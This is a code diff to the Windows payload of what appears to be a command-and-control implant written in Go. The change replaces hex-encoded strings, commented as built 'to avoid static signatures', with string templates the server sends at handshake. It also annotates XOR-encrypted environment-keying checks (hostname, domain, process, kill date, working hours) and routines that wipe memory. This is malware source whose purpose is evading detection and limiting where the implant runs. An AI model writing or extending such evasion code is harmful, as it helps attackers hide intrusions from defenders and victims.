@@ -1,4 +1,4 @@
-// server/docker/payloads/SMB_Windows/exec_requirements_windows.go
+// server/docker/payloads/Windows/exec_requirements_windows.go
 //go:build windows
 // +build windows
 
@@ -53,6 +53,7 @@ func clearString(s *string) {
 	if s == nil || *s == "" {
 		return
 	}
+	// Get pointer to string header
 	hdr := (*struct {
 		Data uintptr
 		Len  int
@@ -60,41 +61,86 @@ func clearString(s *string) {
 	if hdr.Data == 0 || hdr.Len == 0 {
 		return
 	}
+	// Clear the backing array
 	for i := 0; i < hdr.Len; i++ {
 		*(*byte)(unsafe.Pointer(hdr.Data + uintptr(i))) = 0
 	}
 	*s = ""
 }
 
-// Exec requirements strings (constructed to avoid static signatures)
-var (
+// ExecReqTemplate stores exec requirements template strings received from server
+type ExecReqTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Exec requirements template indices - must match server's common.go
+// Windows-specific indices (500-549)
+const (
 	// DLL names
-	erDllNetapi32 = string([]byte{0x6e, 0x65, 0x74, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                 // netapi32.dll
-	erDllSecur32  = string([]byte{0x73, 0x65, 0x63, 0x75, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                       // secur32.dll
+	idxExecReqDllNetapi32 = 500
+	idxExecReqDllSecur32  = 501
 
 	// Proc names
-	erProcNetGetJoinInfo = string([]byte{0x4e, 0x65, 0x74, 0x47, 0x65, 0x74, 0x4a, 0x6f, 0x69, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // NetGetJoinInformation
-	erProcNetApiBufFree  = string([]byte{0x4e, 0x65, 0x74, 0x41, 0x70, 0x69, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x46, 0x72, 0x65, 0x65})                               // NetApiBufferFree
-	erProcGetUserNameEx  = string([]byte{0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x45, 0x78, 0x57})                                           // GetUserNameExW
+	idxExecReqProcNetGetJoinInfo = 502
+	idxExecReqProcNetApiBufFree  = 503
+	idxExecReqProcGetUserNameEx  = 504
 
 	// Environment variable names
-	erEnvUsername    = string([]byte{0x55, 0x53, 0x45, 0x52, 0x4e, 0x41, 0x4d, 0x45})                                     // USERNAME
-	erEnvUserDnsDom  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4e, 0x53, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})       // USERDNSDOMAIN
-	erEnvUserDomain  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})                         // USERDOMAIN
-	erEnvLogonServer = string([]byte{0x4c, 0x4f, 0x47, 0x4f, 0x4e, 0x53, 0x45, 0x52, 0x56, 0x45, 0x52})                   // LOGONSERVER
-	erEnvUserProfile = string([]byte{0x55, 0x53, 0x45, 0x52, 0x50, 0x52, 0x4f, 0x46, 0x49, 0x4c, 0x45})                   // USERPROFILE
+	idxExecReqEnvUsername    = 505
+	idxExecReqEnvUserDnsDom  = 506
+	idxExecReqEnvUserDomain  = 507
+	idxExecReqEnvLogonServer = 508
+	idxExecReqEnvUserProfile = 509
 
 	// String literals
-	erWordTrue       = string([]byte{0x74, 0x72, 0x75, 0x65})                                                             // true
-	erWordExe        = string([]byte{0x2e, 0x65, 0x78, 0x65})                                                             // .exe
-	erPathTildeBack  = string([]byte{0x7e, 0x5c})                                                                         // ~\
-	erPathTildeFwd   = string([]byte{0x7e, 0x2f})                                                                         // ~/
-	erDoubleBacksl   = string([]byte{0x5c, 0x5c})                                                                         // \\
+	idxExecReqWordTrue      = 510
+	idxExecReqWordExe       = 511
+	idxExecReqPathTildeBack = 512
+	idxExecReqPathTildeFwd  = 513
+	idxExecReqDoubleBacksl  = 514
 
 	// Time format strings
-	erTimeFmtFull  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
-	erTimeFmtDate  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32})                                                       // 2006-01-02
+	idxExecReqTimeFmtFull = 515
+	idxExecReqTimeFmtDate = 516
+
+	// Additional environment variables
+	idxExecReqEnvComputername = 517
+
+	// Cross-platform environment variable names (shared indices)
+	idxExecReqEnvUser     = 307
+	idxExecReqEnvLogname  = 308
+	idxExecReqEnvHostname = 320
+	idxExecReqEnvShell    = 321
+
+	// System info strings (for getSystemInfo.go)
+	idxExecReqSysInfoStartupTime  = 322
+	idxExecReqSysInfoStatusActive = 323
 )
+
+// Global exec req template storage (uses SecureTemplate for memory zeroing)
+var globalExecReqTpl *SecureTemplate
+
+// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
+func setExecReqTemplate(tpl *ExecReqTemplate) {
+	// Zero old template before replacing
+	if globalExecReqTpl != nil {
+		globalExecReqTpl.Zero()
+	}
+	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
+}
+
+// erTpl safely retrieves a template string by index
+func erTpl(idx int) string {
+	return globalExecReqTpl.Get(idx)
+}
+
+// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
+func getErStr(idx int) string {
+	return erTpl(idx)
+}
 
 // Windows API constants
 const (
@@ -105,12 +151,23 @@ const (
 )
 
 var (
-	modNetapi32               = windows.NewLazySystemDLL(erDllNetapi32)
-	modSecur32                = windows.NewLazySystemDLL(erDllSecur32)
-	procNetGetJoinInformation = modNetapi32.NewProc(erProcNetGetJoinInfo)
-	procNetApiBufferFree      = modNetapi32.NewProc(erProcNetApiBufFree)
-	procGetUserNameExW        = modSecur32.NewProc(erProcGetUserNameEx)
+	modNetapi32               *windows.LazyDLL
+	modSecur32                *windows.LazyDLL
+	procNetGetJoinInformation *windows.LazyProc
+	procNetApiBufferFree      *windows.LazyProc
+	procGetUserNameExW        *windows.LazyProc
 )
+
+// initWindowsDLLs initializes the Windows DLLs using template strings
+func initWindowsDLLs() {
+	if modNetapi32 == nil {
+		modNetapi32 = windows.NewLazySystemDLL(getErStr(idxExecReqDllNetapi32))
+		modSecur32 = windows.NewLazySystemDLL(getErStr(idxExecReqDllSecur32))
+		procNetGetJoinInformation = modNetapi32.NewProc(getErStr(idxExecReqProcNetGetJoinInfo))
+		procNetApiBufferFree = modNetapi32.NewProc(getErStr(idxExecReqProcNetApiBufFree))
+		procGetUserNameExW = modSecur32.NewProc(getErStr(idxExecReqProcGetUserNameEx))
+	}
+}
 
 // NameFormat constants for GetUserNameEx
 const (
@@ -127,12 +184,18 @@ const (
 )
 
 // PerformSafetyChecks runs all configured safety checks
+// Returns true if all checks pass, false otherwise
 // Safety values are XOR encrypted - decrypt, compare, then clear from memory
 func PerformSafetyChecks() bool {
+	// Initialize DLLs before any checks that might need them
+	initWindowsDLLs()
+
+	// If no safety checks are configured, allow execution
 	if !hasSafetyChecks() {
 		return true
 	}
 
+	// Check hostname (decrypt, compare, clear)
 	if safetyHostname != "" {
 		expected := decryptSafetyValue(safetyHostname)
 		result := checkHostname(expected)
@@ -142,6 +205,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check username (decrypt, compare, clear)
 	if safetyUsername != "" {
 		expected := decryptSafetyValue(safetyUsername)
 		result := checkUsername(expected)
@@ -151,6 +215,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check domain (decrypt, compare, clear)
 	if safetyDomain != "" {
 		expected := decryptSafetyValue(safetyDomain)
 		result := checkDomain(expected)
@@ -160,10 +225,11 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check file existence (decrypt, compare, clear)
 	if safetyFilePath != "" {
 		path := decryptSafetyValue(safetyFilePath)
 		mustExistVal := decryptSafetyValue(safetyFileMustExist)
-		mustExist := mustExistVal == erWordTrue
+		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
 		result := checkFile(path, mustExist)
 		clearString(&path)
 		clearString(&mustExistVal)
@@ -172,6 +238,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check process (decrypt, compare, clear)
 	if safetyProcess != "" {
 		expected := decryptSafetyValue(safetyProcess)
 		result := checkProcess(expected)
@@ -181,6 +248,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check kill date (decrypt, compare, clear)
 	if safetyKillDate != "" {
 		expected := decryptSafetyValue(safetyKillDate)
 		result := checkKillDate(expected)
@@ -190,6 +258,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
+	// Check working hours (decrypt, compare, clear)
 	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
 		start := decryptSafetyValue(safetyWorkHoursStart)
 		end := decryptSafetyValue(safetyWorkHoursEnd)
@@ -238,7 +307,7 @@ func checkUsername(expected string) bool {
 	}
 
 	// Method 2: Environment variable fallback
-	username := os.Getenv(erEnvUsername)
+	username := os.Getenv(getErStr(idxExecReqEnvUsername))
 	if username != "" && strings.EqualFold(username, expected) {
 		return true
 	}
@@ -248,6 +317,10 @@ func checkUsername(expected string) bool {
 
 // getUserNameEx calls the Windows GetUserNameExW API
 func getUserNameEx(nameFormat int) string {
+	if procGetUserNameExW == nil {
+		return ""
+	}
+
 	var size uint32 = 256
 	buf := make([]uint16, size)
 
@@ -278,7 +351,7 @@ func checkDomain(expected string) bool {
 	}
 
 	// Method 2: Check USERDNSDOMAIN environment variable (set for domain users)
-	if dnsDomain := os.Getenv(erEnvUserDnsDom); dnsDomain != "" {
+	if dnsDomain := os.Getenv(getErStr(idxExecReqEnvUserDnsDom)); dnsDomain != "" {
 		if strings.EqualFold(dnsDomain, expected) {
 			return true
 		}
@@ -288,21 +361,21 @@ func checkDomain(expected string) bool {
 	}
 
 	// Method 3: Check USERDOMAIN environment variable (NetBIOS domain name)
-	if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
+	if userDomain := os.Getenv(getErStr(idxExecReqEnvUserDomain)); userDomain != "" {
 		if strings.EqualFold(userDomain, expected) {
 			return true
 		}
 	}
 
 	// Method 4: Check LOGONSERVER (indicates domain controller)
-	if logonServer := os.Getenv(erEnvLogonServer); logonServer != "" {
+	if logonServer := os.Getenv(getErStr(idxExecReqEnvLogonServer)); logonServer != "" {
 		// LOGONSERVER format is \\SERVERNAME
 		// If it's set and not the local machine, likely domain-joined
 		hostname, _ := os.Hostname()
-		serverName := strings.TrimPrefix(logonServer, erDoubleBacksl)
+		serverName := strings.TrimPrefix(logonServer, getErStr(idxExecReqDoubleBacksl))
 		if !strings.EqualFold(serverName, hostname) {
 			// Machine is using a domain controller, check other indicators
-			if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
+			if userDomain := os.Getenv(getErStr(idxExecReqEnvUserDomain)); userDomain != "" {
 				if strings.EqualFold(userDomain, expected) {
 					return true
 				}
@@ -315,6 +388,10 @@ func checkDomain(expected string) bool {
 
 // getJoinedDomain uses NetGetJoinInformation to get the domain name
 func getJoinedDomain() string {
+	if procNetGetJoinInformation == nil || procNetApiBufferFree == nil {
+		return ""
+	}
+
 	var nameBuffer *uint16
 	var joinStatus uint32
 
@@ -345,8 +422,8 @@ func checkFile(path string, mustExist bool) bool {
 	path = os.ExpandEnv(path)
 
 	// Expand ~ to user profile directory
-	if strings.HasPrefix(path, erPathTildeBack) || strings.HasPrefix(path, erPathTildeFwd) {
-		if home := os.Getenv(erEnvUserProfile); home != "" {
+	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeBack)) || strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
+		if home := os.Getenv(getErStr(idxExecReqEnvUserProfile)); home != "" {
 			path = filepath.Join(home, path[2:])
 		}
 	}
@@ -363,7 +440,7 @@ func checkFile(path string, mustExist bool) bool {
 // checkProcess checks if a specific process is running using Windows APIs
 func checkProcess(processName string) bool {
 	// Normalize the process name (remove .exe if present for comparison)
-	searchName := strings.TrimSuffix(strings.ToLower(processName), erWordExe)
+	searchName := strings.TrimSuffix(strings.ToLower(processName), getErStr(idxExecReqWordExe))
 
 	// Use gopsutil which properly uses Windows APIs internally
 	processes, err := process.Processes()
@@ -378,7 +455,7 @@ func checkProcess(processName string) bool {
 		}
 
 		// Normalize the found process name
-		foundName := strings.TrimSuffix(strings.ToLower(name), erWordExe)
+		foundName := strings.TrimSuffix(strings.ToLower(name), getErStr(idxExecReqWordExe))
 
 		// Exact match
 		if foundName == searchName {
@@ -397,10 +474,10 @@ func checkProcess(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
+	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
 	if err != nil {
 		// Try alternate format without time
-		killDate, err = time.Parse(erTimeFmtDate, killDateStr)
+		killDate, err = time.Parse(getErStr(idxExecReqTimeFmtDate), killDateStr)
 		if err != nil {
 			return false
 		}
